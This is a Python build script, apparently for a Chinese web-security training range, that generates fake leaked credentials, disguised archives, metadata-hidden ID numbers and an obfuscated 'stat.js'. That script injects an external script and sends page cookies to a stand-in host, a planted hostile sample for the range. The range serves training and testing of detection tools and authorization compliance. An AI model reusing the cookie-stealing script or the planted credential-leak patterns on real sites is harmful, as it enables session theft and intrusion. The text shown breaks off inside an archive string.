#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
靶场静态资产构建脚本
==================================================================

关卡里那些**必须是真的二进制/真文件**的东西，由这个脚本生成：

    static/index.html                     靶场门户（按关卡注册表自动生成）
    static/style.css                      全站样式

    L1  static/l1/files/db.sql            数据库导出（含 INSERT INTO，能过内容校验）
    L1  static/l1/files/config.php.bak    配置备份（含明文口令）
    L1  static/l1/files/contact-list.csv  通讯录导出
    L1  static/l1/js/vendor/jquery.min.js jQuery 1.12.4（旧版本，可被版本检测命中）
    L1  static/l1/images/banner.png       一张正常图片

    L2  static/l2/.git/{config,HEAD,logs/HEAD}   真实的 Git 元数据残留
    L2  static/l2/.env                    环境变量文件（含口令、密钥）
    L2  static/l2/js/stat.js              混淆的外部 JS（挂马载体）
    L2  static/l2/backup/*.tar.gz         真实的 tar.gz 归档
    L2  static/l2/js/vendor/bootstrap.min.js

    L3  static/l3/download/2023-archive.dat   **伪装的 ZIP**（扩展名骗人，靠内容特征识别）

    L5  static/l5/images/seal.png          PNG，tEXt 元数据块里藏证件号

    L6  static/l6/.git/{config,HEAD,logs/HEAD}
    L6  static/l6/src/site-2024.tar.gz     源码归档（含 settings.py，给出接口地址+令牌前半）

为什么用脚本生成而不是直接放文件？
    · 二进制文件（ZIP/GZIP/PNG）手搓容易错，脚本生成可保证合法
    · 门户页要从关卡注册表读数据，手写会和关卡定义脱节
    · 一次性可重现，改了关卡重新跑一遍就行

用法：
    py build_assets.py            # 生成（已存在则覆盖）
    py build_assets.py --clean    # 先清空 static 再生成
==================================================================
"""

import argparse
import gzip
import hashlib
import io
import json
import shutil
import struct
import sys
import tarfile
import zipfile
import zlib
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
STATIC = BASE_DIR / "static"

sys.path.insert(0, str(BASE_DIR))
from rangekit import FAKE, PEOPLE  # noqa: E402


# ==================================================================
# 工具
# ==================================================================

def write(path, data, mode="w"):
    """写文件，自动建目录。data 为 str 时按 UTF-8 写，bytes 直接写。"""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, str):
        path.write_text(data, encoding="utf-8", newline="\n")
    else:
        path.write_bytes(data)
    try:
        shown = path.relative_to(BASE_DIR)
    except ValueError:
        shown = path
    print(f"  写入 {shown}  ({path.stat().st_size} B)")


def png_chunk(tag, payload):
    """按 PNG 规范组装一个数据块：长度 + 类型 + 数据 + CRC32。"""
    return (struct.pack(">I", len(payload)) + tag + payload
            + struct.pack(">I", zlib.crc32(tag + payload) & 0xFFFFFFFF))


def itxt_chunk(keyword, value, lang="zh-CN", translated=""):
    """
    组装一个 iTXt（国际化文本）数据块。

    为什么不用 tEXt？—— tEXt 只能存 Latin-1，写不了中文。
    iTXt 的数据段是 UTF-8，可以放任意字符，这也是现代工具
    （Photoshop / exiftool 等）写中文元数据时用的块。

    结构：关键字 \\0 压缩标志(1B) 压缩方法(1B) 语言标记 \\0 译名 \\0 正文(UTF-8)
    """
    payload = (keyword.encode("latin-1") + b"\x00"
               + b"\x00"                       # 未压缩
               + b"\x00"                       # 压缩方法（未压缩时固定为 0）
               + lang.encode("ascii", "ignore") + b"\x00"
               + translated.encode("utf-8") + b"\x00"
               + value.encode("utf-8"))
    return png_chunk(b"iTXt", payload)


def make_png(width, height, rgb, text_chunks=None):
    """
    生成一张合法的最小 PNG。

    text_chunks: [("关键字", "内容"), ...] → 写成 iTXt 数据块。
    **元数据块是 L5 的考点**：用看图软件打开完全看不出异常，
    但只要用二进制工具（或 exiftool / pngcheck / strings）就能读出里面的文字。
    """
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = png_chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
    text = b""
    for keyword, value in (text_chunks or []):
        text += itxt_chunk(keyword, value)
    raw = b""
    row = bytes(rgb) * width
    for _ in range(height):
        raw += b"\x00" + row          # 每行前面一个 filter 字节 0
    idat = png_chunk(b"IDAT", zlib.compress(raw, 9))
    return sig + ihdr + text + idat + png_chunk(b"IEND", b"")


def make_tar_gz(files):
    """把 {路径: 内容} 打包成 tar.gz（内存里完成）。"""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, content in files.items():
            data = content.encode("utf-8") if isinstance(content, str) else content
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mtime = 1709913600        # 2024-03-08
            info.mode = 0o644
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def make_zip(files):
    """把 {路径: 内容} 打包成 ZIP（内存里完成）。"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            data = content.encode("utf-8") if isinstance(content, str) else content
            info = zipfile.ZipInfo(name, date_time=(2023, 11, 8, 14, 22, 10))
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, data)
    return buf.getvalue()


# ==================================================================
# 门户与样式
# ==================================================================

def build_portal():
    """
    生成 static/index.html。

    注意这里**直接从关卡注册表读数据** ——
    改了关卡的名字/难度/提示，门户页会自动跟着变，不会脱节。
    """
    import levels

    cards = []
    for key, lv in levels.REGISTRY.items():
        tags = "".join(f'<span class="tag">{t}</span>' for t in lv.get("tags", ()))
        # 禁区（L0）单独一种外观：红色、带删除线式的视觉语言
        denied = lv.get("kind") == "denied"
        cls = "card denied" if denied else "card"
        hint_label = "记住：" if denied else "提示："
        cards.append(f"""
  <a class="{cls}" href="/{key}/">
    <div class="card-head">
      <span class="lv">{'禁' if denied else 'L' + str(lv['id'])}</span>
      <span class="name">{lv.get('name','')}</span>
      <span class="diff">{lv.get('difficulty','')}</span>
    </div>
    <p class="summary">{lv.get('summary','')}</p>
    <p class="hint"><strong>{hint_label}</strong>{lv.get('hints','')}</p>
    <div class="tags">{tags}</div>
  </a>""")

    html = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>网站安全巡检 · 分级靶场</title>
<link rel="stylesheet" href="/style.css">
</head>
<body class="portal">
<header><div class="wrap">
  <h1><a href="/">网站安全巡检 · 分级靶场</a></h1>
  <p class="sub">按难度从易到难排列的 6 个关卡，外加 1 个未授权禁区，供巡检工具与人工测试者评测检测能力与授权合规性。</p>
</div></header>

<main class="wrap">
  <div class="notice">
    <p><strong>这是一个训练/评测靶场。</strong>所有页面、数据、账号口令均为编造的测试数据，
       不含任何真实单位信息。请仅在自己拥有或已获授权的环境中使用。</p>
    <p class="tiny">访问日志记录在 <code>logs/access.log</code>；越界访问另记在
       <code>logs/out-of-scope.log</code>，可用于复盘测试过程与合规性审查。</p>
  </div>
  <div class="notice">
    <p><strong>先读这个：</strong>可配置的授权范围在 <code>scope.json</code>，
       判定工具：<code>py scope.py --show</code>。
       其中 <code>/l0/</code> 是<strong>明确排除</strong>的未授权站点 —— 扫描它属越权行为。</p>
  </div>
{''.join(cards)}
</main>

<footer><div class="wrap">
  <p>某某市政务服务与大数据管理局 · 信息中心（虚构单位）</p>
</div></footer>
</body>
</html>
"""
    write(STATIC / "index.html", html)


CSS = """/* ==========================================================
   分级靶场 · 全站样式
   目标：看起来像一个"有点年头的政府门户网站"，
        同时保证门户页和信息密度较高的页面可读。
   ========================================================== */

:root {
  --blue: #1a4d8f;
  --blue-d: #123a6d;
  --ink: #23272c;
  --muted: #7a828c;
  --line: #dfe4ea;
  --bg: #f4f6f9;
  --warn: #c8811a;
  --danger: #c0392b;
  --ok: #1e8e5a;
}

* { box-sizing: border-box; }

body {
  margin: 0;
  background: var(--bg);
  color: var(--ink);
  font-family: "Source Han Sans SC", "Microsoft YaHei", "PingFang SC", sans-serif;
  font-size: 15px;
  line-height: 1.75;
}

.wrap { max-width: 1080px; margin: 0 auto; padding: 0 20px; }

a { color: var(--blue); text-decoration: none; }
a:hover { text-decoration: underline; }

header {
  background: var(--blue);
  color: #fff;
  padding: 18px 0 12px;
  border-bottom: 4px solid var(--blue-d);
}
header h1 { margin: 0; font-size: 24px; font-weight: 600; letter-spacing: 1px; }
header h1 a { color: #fff; }
header nav { margin-top: 10px; font-size: 14px; }
header nav a { color: #d6e4f7; margin-right: 4px; }
header nav a:hover { color: #fff; }
.muted { color: #b9cbe4; }

main { padding: 26px 0 50px; }

h2 {
  font-size: 19px;
  border-left: 4px solid var(--blue);
  padding-left: 10px;
  margin: 30px 0 14px;
}
h3 { font-size: 16px; margin: 20px 0 8px; }

p { margin: 10px 0; }

table {
  width: 100%;
  border-collapse: collapse;
  background: #fff;
  margin: 14px 0;
  font-size: 14px;
}
th, td { border: 1px solid var(--line); padding: 8px 10px; text-align: left; }
th { background: #eef2f7; font-weight: 600; }
tbody tr:nth-child(even) { background: #fafbfd; }

article { background: #fff; border: 1px solid var(--line); padding: 16px 20px; margin: 16px 0; }
article h2, article h3 { margin-top: 4px; }
.meta { color: var(--muted); font-size: 13px; }

.box { background: #fff; border: 1px solid var(--line); border-left: 4px solid var(--blue); padding: 12px 16px; margin: 16px 0; }
.box h3 { margin-top: 0; }
.box.warn { border-left-color: var(--warn); background: #fffaf0; }
.box.danger { border-left-color: var(--danger); background: #fdf3f2; }
.box.ok { border-left-color: var(--ok); background: #f1faf6; }

code, pre {
  font-family: Consolas, "Cascadia Mono", monospace;
  background: #eef1f5;
  border-radius: 3px;
}
code { padding: 1px 5px; font-size: 13px; }
pre { padding: 12px; overflow-x: auto; font-size: 13px; line-height: 1.5; }

form label { display: block; margin: 10px 0; }
input, button { font: inherit; padding: 6px 10px; border: 1px solid var(--line); border-radius: 3px; }
input { background: #fff; min-width: 220px; }
button { background: var(--blue); color: #fff; border-color: var(--blue); cursor: pointer; }

.login { max-width: 380px; background: #fff; border: 1px solid var(--line); padding: 20px 24px; margin: 40px auto; }
.login h2 { border: none; padding: 0; margin-top: 0; }

.tiny { color: var(--muted); font-size: 12px; }
.banner-placeholder { background: #e8edf4; color: var(--muted); text-align: center; padding: 60px 0; }
.cred { color: var(--blue); cursor: pointer; border-bottom: 1px dashed var(--blue); }

footer { border-top: 1px solid var(--line); background: #fff; padding: 18px 0 26px; margin-top: 40px; font-size: 13px; color: #555; }
footer p { margin: 4px 0; }

/* ---------------- 门户页 ---------------- */
body.portal header { padding: 40px 0 30px; }
body.portal header .sub { color: #c8d9ef; margin: 10px 0 0; font-size: 14px; }

.notice { background: #fff; border-left: 4px solid var(--warn); padding: 14px 20px; margin: 24px 0 30px; }
.notice p { margin: 6px 0; }

.card {
  display: block;
  background: #fff;
  border: 1px solid var(--line);
  border-radius: 4px;
  padding: 18px 22px;
  margin: 14px 0;
  color: var(--ink);
  transition: box-shadow .15s, transform .15s;
}
.card:hover { text-decoration: none; box-shadow: 0 4px 16px rgba(26,77,143,.13); transform: translateY(-2px); }
.card-head { display: flex; align-items: baseline; gap: 12px; flex-wrap: wrap; }
.card .lv { background: var(--blue); color: #fff; border-radius: 3px; padding: 2px 9px; font-size: 13px; font-weight: 600; }
.card .name { font-size: 18px; font-weight: 600; }
.card .diff { color: var(--warn); font-size: 15px; letter-spacing: 2px; }
.card .summary { color: #4a5560; margin: 8px 0 4px; }
.card .hint { color: var(--muted); font-size: 13px; margin: 4px 0; }
.card .tags { margin-top: 10px; }
.card .tag { display: inline-block; background: #eef2f7; color: #4a5560; border-radius: 3px; padding: 1px 8px; margin-right: 6px; font-size: 12px; }

/* ---------------- 禁区卡片（L0） ---------------- */
.card.denied {
  border-left: 5px solid var(--danger);
  background: #fffafa;
}
.card.denied:hover { box-shadow: 0 4px 16px rgba(192,57,43,.18); }
.card.denied .lv { background: var(--danger); }
.card.denied .name { color: var(--danger); }
.card.denied .diff { color: var(--danger); letter-spacing: 0; font-size: 13px; }
.card.denied .hint { color: #9a4034; }

/* ---------------- 未授权告示（L0 各页顶部） ---------------- */
.forbidden {
  background: #fdf3f2;
  border: 1px solid #e6b8b2;
  border-left: 6px solid var(--danger);
  padding: 16px 22px;
  margin: 0 0 26px;
}
.forbidden h2 { border: none; padding: 0; margin: 0 0 8px; color: var(--danger); font-size: 20px; }
.forbidden p { margin: 6px 0; color: #7d3a31; }
.forbidden .tiny { color: #9a6b64; }
"""


# ==================================================================
# L1
# ==================================================================

def build_l1():
    d = STATIC / "l1"

    # ---- 数据库导出：含 INSERT INTO（能被内容特征校验命中）----
    rows = ",\n".join(
        f"  ('{iid}', '{name.strip()}', '{phone}', '{dept}', '{staff}')"
        for iid, name, phone, dept, staff in PEOPLE
    )
    write(d / "files/db.sql", f"""-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: 10.12.34.51    Database: zwfw_prod
-- ------------------------------------------------------
-- Server version	5.7.29-log

/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET TIME_ZONE='+08:00' */;

--
-- 表的结构 `zwfw_staff`
--

DROP TABLE IF EXISTS `zwfw_staff`;
CREATE TABLE `zwfw_staff` (
  `id_card` varchar(18) NOT NULL,
  `name` varchar(32) DEFAULT NULL,
  `phone` varchar(20) DEFAULT NULL,
  `dept` varchar(64) DEFAULT NULL,
  `staff_no` varchar(16) DEFAULT NULL,
  PRIMARY KEY (`id_card`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- 转存表中的数据 `zwfw_staff`
--

INSERT INTO `zwfw_staff` (`id_card`, `name`, `phone`, `dept`, `staff_no`) VALUES
{rows};

DROP TABLE IF EXISTS `zwfw_account`;
CREATE TABLE `zwfw_account` (
  `username` varchar(32) NOT NULL,
  `password` varchar(64) DEFAULT NULL,
  `role` varchar(16) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO `zwfw_account` (`username`, `password`, `role`) VALUES
  ('{FAKE["admin_user"]}', '{FAKE["admin_pass"]}', 'admin'),
  ('zhangweiming', 'Zwfw@2024', 'editor'),
  ('liyang', 'Zwfw@2024', 'viewer');

-- Dump completed on 2024-03-11 17:42:08
""")

    # ---- 配置备份：明文数据库口令 ----
    write(d / "files/config.php.bak", f"""<?php
/**
 * 某某市政务服务网 · 系统配置
 * ⚠ 本文件为部署前备份，上线后应当删除
 */
return array(
    'db' => array(
        'host'     => '{FAKE["db_ip"]}',
        'port'     => 3306,
        'name'     => 'zwfw_prod',
        'user'     => '{FAKE["db_user"]}',
        'password' => '{FAKE["db_pass"]}',
        'charset'  => 'utf8mb4',
    ),
    'redis' => array(
        'host' => '{FAKE["internal_ip"]}',
        'port' => 6379,
        'auth' => 'redis@zwfw2023',
    ),
    'ftp' => array(
        'host' => '10.12.34.60',
        'user' => 'zwfw_upload',
        'pass' => '{FAKE["ftp_pass"]}',
    ),
    'admin' => array(
        'username' => '{FAKE["admin_user"]}',
        'password' => '{FAKE["admin_pass"]}',
    ),
    'debug' => true,
    'app_key' => 'base64:{FAKE["api_secret"][:24]}',
);
""")

    # ---- 通讯录导出 ----
    csv = "序号,姓名,所属科室,联系电话,工作邮箱\n"
    for idx, (iid, name, phone, dept, staff) in enumerate(PEOPLE, 1):
        mail = f"{FAKE['mail_1'].split('@')[0]}{idx}@zwfw.gov.cn"
        csv += f"{idx},{name.strip()},{dept},{phone},{mail}\n"
    write(d / "files/contact-list.csv", csv)

    write(d / "files/README.txt", """部署说明
========================================
1. 解压站点包到 /var/www/zwfw
2. 导入数据库： mysql -u root -p zwfw_prod < db.sql
3. 复制 config.php.bak 为 config.php 并修改数据库口令
4. 后台入口 /admin/ ，默认账号见 config.php.bak
5. 内网 OA 地址： http://10.12.34.51:8080/

运维组  2024-03-11
""")

    # ---- 旧版 jQuery（版本检测会命中 CVE-2020-11022）----
    write(d / "js/vendor/jquery.min.js", """/*! jQuery v1.12.4 | (c) jQuery Foundation | jquery.org/license */
!function(a,b){"object"==typeof module&&"object"==typeof module.exports?
module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new Error("jQuery requires a window with a document");
return b(a)}:b(a)}("undefined"!=typeof window?window:this,function(a,b){var c=[],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.toString,k=i.hasOwnProperty,l={},m="1.12.4",n=function(a,b){return new n.fn.init(a,b)},o=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;
n.fn=n.prototype={jquery:m,constructor:n,selector:"",length:0,toArray:function(){return e.call(this)}};
n.fn.init=function(a,b){return this};
n.fn.init.prototype=n.fn;window.jQuery=window.$=n;return n});
""")

    write(d / "js/main.js", """/* main.js - 站点交互脚本 */
(function () {
  document.addEventListener('DOMContentLoaded', function () {
    var links = document.querySelectorAll('nav a');
    for (var i = 0; i < links.length; i++) {
      links[i].addEventListener('click', function () {
        /* 埋点：记录导航点击 */
      });
    }
  });
})();
""")

    write(d / "images/banner.png", make_png(240, 60, (26, 77, 143),
                                          [("Software", "zwfw-portal")]))

    # ---- 后台目录下放一个说明文件，让目录列表有内容可列 ----
    write(d / "admin/README.txt", "后台管理系统\n账号：admin\n口令：Admin@888\n（上线前请修改）\n")


# ==================================================================
# L2
# ==================================================================

def build_l2():
    d = STATIC / "l2"

    write(d / ".git/config", """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
[remote "origin"]
\turl = http://git.zwfw.internal/ops/zwfw-portal.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
\tremote = origin
\tmerge = refs/heads/master
[user]
\tname = 陈晓东
\temail = chenxiaodong@zwfw.gov.cn
""")

    write(d / ".git/HEAD", "ref: refs/heads/master\n")

    write(d / ".git/logs/HEAD", f"""0000000000000000000000000000000000000000 8f2a1c9e4b7d3a6f5e8c0b2d4a7f1e3c9b5d8a02 陈晓东 <chenxiaodong@zwfw.gov.cn> 1704067200 +0800\tcommit (initial): init portal
8f2a1c9e4b7d3a6f5e8c0b2d4a7f1e3c9b5d8a02 3b9d5e7a1c4f8b2d6e0a9c3f5b7d1e8a4c6f0b2e 张伟明 <{FAKE['mail_1']}> 1706572800 +0800\tcommit: 增加补贴公示栏
3b9d5e7a1c4f8b2d6e0a9c3f5b7d1e8a4c6f0b2e 7c1e5a9b3d7f0c4e8a2b6d1f5c9e3a7b4d8f2c0a 陈晓东 <chenxiaodong@zwfw.gov.cn> 1709856000 +0800\tcommit: 修复联系表单
""")

    write(d / ".git/description", "Unnamed repository; edit this file 'description' to name the repository.\n")

    # ---- .env：真实世界里最常见的泄露源 ----
    write(d / ".env", f"""# 应用环境配置
APP_ENV=production
APP_DEBUG=true
APP_KEY=base64:{FAKE["api_secret"]}

DB_CONNECTION=mysql
DB_HOST={FAKE["db_ip"]}
DB_PORT=3306
DB_DATABASE=zwfw_prod
DB_USERNAME={FAKE["db_user"]}
DB_PASSWORD={FAKE["db_pass_2"]}

REDIS_HOST={FAKE["internal_ip_2"]}
REDIS_PASSWORD=redis@zwfw2023

MAIL_MAILER=smtp
MAIL_HOST=smtp.zwfw.gov.cn
MAIL_USERNAME={FAKE["mail_3"]}
MAIL_PASSWORD=Mail@Zwfw2024

AWS_ACCESS_KEY_ID={FAKE["api_key"]}
AWS_SECRET_ACCESS_KEY={FAKE["api_secret"]}

FTP_HOST=10.12.34.60
FTP_USER=zwfw_upload
FTP_PASSWORD={FAKE["ftp_pass"]}
""")

    # ---- 混淆的外部 JS（挂马载体）----
    write(d / "js/stat.js", """/*! stat.js - 访问统计 */
var _0x4f2a=["\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x73\\x74\\x61\\x74\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65\\x2d\\x63\\x64\\x6e\\x2e\\x63\\x6f\\x6d\\x2f\\x63\\x2e\\x67\\x69\\x66","\\x72\\x65\\x66","\\x63\\x6f\\x6f\\x6b\\x69\\x65"];
(function(_0x1b2c){
  var _0x3d4e=document.createElement("script");
  _0x3d4e.src="//cdn.example-cdn.com/lib/tracker.min.js";
  _0x3d4e.async=true;
  document.head.appendChild(_0x3d4e);
  try{
    new Image().src=_0x1b2c[0]+"?ref="+encodeURIComponent(location.href)+"&c="+encodeURIComponent(document[_0x1b2c[2]]);
  }catch(e){}
})(_0x4f2a);
""")

    write(d / "js/vendor/bootstrap.min.js", """/*!
 * Bootstrap v3.3.7 (http://getbootstrap.com)
 * Copyright 2011-2016 Twitter, Inc.
 * Licensed under MIT
 */
if("undefined"==typeof jQuery)throw new Error("Bootstrap's JavaScript requires jQuery");
+function(a){"use strict";var b=a.fn.jquery.split(" ")[0].split(".");
if(b[0]<2&&b[1]<9||1==b[0]&&9==b[1]&&b[2]<1||b[0]>3)throw new Error("Bootstrap requires jQuery 1.9.1+")}(jQuery);
+function(a){"use strict";function b(){var a=document.createElement("bootstrap"),b={WebkitTransition:"webkitTransitionEnd"};for(var c in b)if(void 0!==a.style[c])return{end:b[c]}}
a.fn.emulateTransitionEnd=function(b){var c=!1,d=this;a(this).one("bsTransitionEnd",function(){c=!0});return setTimeout(function(){c||a(d).trigger(a.support.transition.end)},b),this};
a(function(){a.support.transition=b()})}(jQuery);
""")

    # ---- 真实的 tar.gz 归档 ----
    archive = make_tar_gz({
        "zwfw-portal/index.html": "<!DOCTYPE html><html><body><h1>某某市政务服务网</h1></body></html>\n",
        "zwfw-portal/config.php": "<?php return array('db_host'=>'10.12.34.51','db_user'=>'zwfw_app','db_pass'=>'P@ssw0rd_2024');\n",
        "zwfw-portal/README.md": "# 某某市政务服务网\n\n备份时间：2023-11-08\n备份人：陈晓东\n",
        "zwfw-portal/data/zwfw_staff.sql": "INSERT INTO zwfw_staff VALUES ('330106199003074512','张伟明','13857198264');\n",
    })
    write(d / "backup/website-backup-20231108.tar.gz", archive)

    write(d / "css/style.css", "/* 旧版站点样式，已废弃 */\nbody{font-family:'Microsoft YaHei';}\n")


# ==================================================================
# L3
# ==================================================================

def build_l3():
    d = STATIC / "l3"

    # ---- 伪装的 ZIP：扩展名是 .dat，内容其实是 ZIP ----
    archive = make_zip({
        "2023/roster.csv": "身份证号,姓名,联系电话,所属科室\n" + "\n".join(
            f"{i},{n.strip()},{p},{dp}" for i, n, p, dp, _s in PEOPLE),
        "2023/accounts.txt": f"admin:{FAKE['admin_pass']}\nzwfw_app:{FAKE['db_pass_2']}\n",
        "2023/readme.txt": "2023 年度归档数据，请勿外传。\n",
        "2023/db-config.ini": f"[mysql]\nhost={FAKE['db_ip']}\nuser={FAKE['db_user']}\npassword={FAKE['db_pass']}\n",
    })
    write(d / "download/2023-archive.dat", archive)
    write(d / "download/README.txt", "本目录存放年度归档数据，仅限内部使用。\n")

    write(d / "images/logo.png", make_png(120, 40, (30, 90, 160), [("Comment", "zwfw logo")]))


# ==================================================================
# L4
# ==================================================================

def build_l4():
    d = STATIC / "l4"
    write(d / "download/policy.pdf", b"%PDF-1.4\n% placeholder, not a real PDF\n%%EOF\n")
    write(d / "upload/README.txt", "上传目录（临时）\n")


# ==================================================================
# L5
# ==================================================================

def build_l5():
    d = STATIC / "l5"

    # ★ 考点：敏感信息藏在 PNG 的 tEXt 元数据里。
    #   用看图软件打开就是一张普通的印章图片，完全看不出异常。
    #   采集时间 2024-03-13 02:41 晚于页面公布的改版日期，也是篡改线索。
    text = (
        "持有人:张伟明;身份号码:330106199003074512;"
        "科室:信息中心;工号:GW100237;"
        "采集时间:2024-03-13T02:41:07+08:00;"
        "采集设备:SCAN-04(10.12.34.77)"
    )
    write(d / "images/seal.png", make_png(32, 32, (198, 40, 40), [
        ("Description", text),
        ("Software", "ZW-Scanner 2.1"),
        ("Author", "zwfw-ops"),
    ]))

    write(d / "images/logo.png", make_png(80, 26, (26, 77, 143)))
    write(d / "download/README.txt", "资料下载目录\n")


# ==================================================================
# L0（禁区：诱饵文件，全部静态、无副作用）
# ==================================================================

def build_l0():
    """
    L0 的"诱饵"文件。

    ⚠ 这里的每一份都是**静态文本**，刻意不放任何可执行内容：
       · db.sql / config.php.bak / .env  → 纯文本，仅内容像真的
       · 没有 .php、没有 WebShell、没有上传点
      理由见 levels/l0_denied.py 的模块注释 ——
      "不该被访问的站点"不该同时是"最危险的站点"。
    """
    d = STATIC / "l0"

    rows = ",\n".join(
        f"  ('{iid}', '{name.strip()}', '{phone}', '{dept}')"
        for iid, name, phone, dept, _s in PEOPLE[:5]
    )
    write(d / "files/db.sql", f"""-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
-- Host: 10.31.7.15    Database: qu_zwfw
-- 某某区政务服务中心  导出时间 2024-02-28
-- ------------------------------------------------------

DROP TABLE IF EXISTS `qu_staff`;
CREATE TABLE `qu_staff` (
  `id_card` varchar(18) NOT NULL,
  `name` varchar(32) DEFAULT NULL,
  `phone` varchar(20) DEFAULT NULL,
  `dept` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`id_card`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO `qu_staff` (`id_card`, `name`, `phone`, `dept`) VALUES
{rows};

-- Dump completed on 2024-02-28 11:07:33
""")

    write(d / "files/config.php.bak", """<?php
/**
 * 某某区政务服务中心 · 系统配置（部署前备份）
 */
return array(
    'db' => array(
        'host'     => '10.31.7.15',
        'port'     => 3306,
        'name'     => 'qu_zwfw',
        'user'     => 'qu_app',
        'password' => 'Qu#Zwfw@2024',
    ),
    'cache' => array('host' => '10.31.7.22', 'port' => 6379),
    'admin' => array('username' => 'admin', 'password' => '123456'),
    'debug' => true,
);
""")

    write(d / "files/README.txt", """某某区政务服务中心 · 站点说明
========================================
本目录存放业务数据导出与配置备份。

联系方式：security@example-qu.gov.cn

⚠ 本站未授权任何第三方进行安全扫描或内容抓取。
   如需评估本站点，请先取得本站主管单位书面授权。
""")

    write(d / ".env", f"""APP_ENV=production
APP_DEBUG=true
APP_KEY=base64:qu-{FAKE["api_secret"][:20]}

DB_HOST=10.31.7.15
DB_PORT=3306
DB_DATABASE=qu_zwfw
DB_USERNAME=qu_app
DB_PASSWORD=Qu#Zwfw@2024

REDIS_HOST=10.31.7.22
AWS_ACCESS_KEY_ID={FAKE["api_key"]}
AWS_SECRET_ACCESS_KEY={FAKE["api_secret"]}
""")

    write(d / ".git/config", """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
[remote "origin"]
\turl = http://git.example-qu.gov.cn/center/portal.git
[branch "master"]
\tremote = origin
\tmerge = refs/heads/master
[user]
\tname = 某某区信息科
\temail = security@example-qu.gov.cn
""")
    write(d / ".git/HEAD", "ref: refs/heads/master\n")

    write(d / "admin/README.txt", """后台管理说明
账号：admin
口令：123456

⚠ 本站未授权任何第三方扫描。请勿探测本目录。
""")


# ==================================================================
# L6
# ==================================================================

def build_l6():
    d = STATIC / "l6"

    write(d / ".git/config", """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
[remote "origin"]
\turl = http://git.zwfw.internal/ops/zwfw-2024.git
[branch "master"]
\tremote = origin
\tmerge = refs/heads/master
[user]
\tname = 运维保障组
\temail = ops@zwfw.gov.cn
""")
    write(d / ".git/HEAD", "ref: refs/heads/master\n")
    write(d / ".git/logs/HEAD", f"""0000000000000000000000000000000000000000 5c8a2e6b0d9f3a7c1e4b8d2f6a0c5e9b3d7f1a4c 运维保障组 <ops@zwfw.gov.cn> 1709856000 +0800\tcommit (initial): 站点改版 v2
5c8a2e6b0d9f3a7c1e4b8d2f6a0c5e9b3d7f1a4c 9e3b7d1f5a8c2e6b0d4f9a3c7e1b5d8f2a6c0e4b 运维保障组 <ops@zwfw.gov.cn> 1709913600 +0800\tcommit: 归档上线前配置 /l6/src/site-2024.tar.gz
""")

    # ★ 源码归档：给出内部接口地址 + 令牌前半段
    settings = f'''# -*- coding: utf-8 -*-
"""某某市政务服务网 · 生产环境配置（归档副本）"""

DEBUG = False
SECRET_KEY = "django-insecure-{FAKE['api_secret'][:20]}"

DATABASES = {{
    "default": {{
        "ENGINE": "django.db.backends.mysql",
        "HOST": "{FAKE['db_ip']}",
        "PORT": 3306,
        "NAME": "zwfw_prod",
        "USER": "{FAKE['db_user']}",
        "PASSWORD": "{FAKE['db_pass']}",
    }}
}}

# ------------------------------------------------------------------
# 内部服务接口
#   该接口仅限内网调用，通过请求头 X-Api-Token 校验
#   完整令牌由两段拼接而成（后半段由接口自行返回）
# ------------------------------------------------------------------
INTERNAL_API = "/l6/api/internal/keys"
API_TOKEN_PART1 = "ZW1-API-TOKEN-2024-A1B2"       # 前半段
# API_TOKEN_PART2 由接口返回，不在配置中留存

CLOUD = {{
    "provider": "政务云",
    "region": "cn-east-1",
}}

OA_PORTAL = "{FAKE['oa_url']}"
ADMIN_IP = "{FAKE['internal_ip']}"
MAINTAINER = "运维保障组 <ops@zwfw.gov.cn>"
ARCHIVED_AT = "2024-03-08"
'''

    archive = make_tar_gz({
        "site-2024/settings.py": settings,
        "site-2024/urls.py": '''from django.urls import path
from . import views

urlpatterns = [
    path("", views.index, name="index"),
    path("notice.html", views.notice, name="notice"),
    path("api/internal/keys", views.internal_keys, name="internal-keys"),
]
''',
        "site-2024/views.py": '''from django.http import JsonResponse
from django.conf import settings

def internal_keys(request):
    """内部凭据下发接口 —— 仅校验 X-Api-Token 请求头。"""
    token = request.headers.get("X-Api-Token", "")
    if not token:
        return JsonResponse({"code": 401, "msg": "missing X-Api-Token"}, status=401)
    if token != settings.API_TOKEN_PART1:
        return JsonResponse({"code": 403, "msg": "invalid token"}, status=403)
    # 返回令牌后半段与云平台凭据
    return JsonResponse({"code": 0, "token_tail": "C3D4-E5F6-7890"})

def index(request):
    return JsonResponse({"code": 0, "msg": "ok"})
''',
        "site-2024/README.md": """# 某某市政务服务网 v2

改版上线日期：2024-03-12
运维责任人：运维保障组

## 部署说明

1. 依赖：Django 3.2 + MySQL 5.7
2. 配置见 settings.py
